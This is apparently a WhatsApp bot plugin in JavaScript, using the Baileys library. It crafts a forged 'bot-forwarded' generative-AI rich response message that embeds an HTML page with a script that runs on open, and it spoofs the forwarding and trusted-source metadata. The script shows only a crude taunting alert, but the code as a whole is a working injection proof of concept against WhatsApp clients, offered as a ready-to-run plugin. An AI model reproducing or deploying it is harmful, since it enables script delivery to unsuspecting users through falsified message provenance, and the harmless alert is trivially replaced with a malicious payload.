const { generateWAMessageFromContent } = await import('@whiskeysockets/baileys');
const crypto = await import('node:crypto');
const client = sock || global.conn;

if (!client?.relayMessage || !m?.chat) {
    throw new Error('Koneksi WhatsApp atau chat tidak tersedia.');
}

const htmlPayload = `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Tes Alert</title>
<style>
body { background: #0b141a; color: #e9edef; font-family: sans-serif; text-align: center; padding: 32px 16px; }
</style>
</head>
<body>
<h2>Tes popup alert</h2>
<p>Popup alert dijalankan otomatis saat halaman dibuka.</p>
<script>
var movesCount = 1;
setTimeout(function() { alert('woi ireng woi poke'); }, 200);
<\/script>
</body>
</html>`;

const slots = {
    messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2,
        botMetadata: {
            pluginMetadata: {},
            richResponseSourcesMetadata: { sources: [] }
        }
    },
    botForwardedMessage: {
        message: {
            richResponseMessage: {
                messageType: 1,
                submessages: [
                    { messageType: 2, messageText: '> Tes Alert' }
                ],
                unifiedResponse: {
                    data: Buffer.from(
                        JSON.stringify({
                            __typename: 'GenAIUnifiedResponse',
                            response_id: crypto.randomUUID(),
                            sections: [
                                {
                                    view_model: {
                                        primitive: {
                                            text: '> Tes Alert',
                                            __typename: 'GenAIMarkdownTextUXPrimitive'
                                        },
                                        __typename: 'GenAISingleLayoutViewModel'
                                    }
                                }
                            ],
                            embedded_screens: [
                                {
                                    title: 'Preview',
                                    content: [
                                        {
                                            __typename: 'FOAIDNixelButtonSheets',
                                            tabs: [
                                                {
                                                    id: 'tab_0',
                                                    tab_header: 'Tes Alert',
                                                    sections: [
                                                        {
                                                            __typename: 'GenAIUnifiedResponseSection',
                                                            view_model: {
                                                                __typename: 'GenAISingleLayoutViewModel',
                                                                primitive: {
                                                                    __typename: 'GenAIaeacdsnwHtmlPrimitive',
                                                                    payload: htmlPayload,
                                                                    url: 'https://nixel.dev',
                                                                    trusted_sources: ['nixel.dev']
                                                                }
                                                            }
                                                        }
                                                    ],
                                                    step_entries: []
                                                }
                                            ]
                                        }
                                    ]
                                }
                            ]
                        })
                    ).toString('base64')
                },
                contextInfo: {
                    isForwarded: true,
                    forwardOrigin: 4,
                    forwardingScore: 999
                }
            }
        }
    }
};

const msg = generateWAMessageFromContent(m.chat, slots, { quoted: m });
await client.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
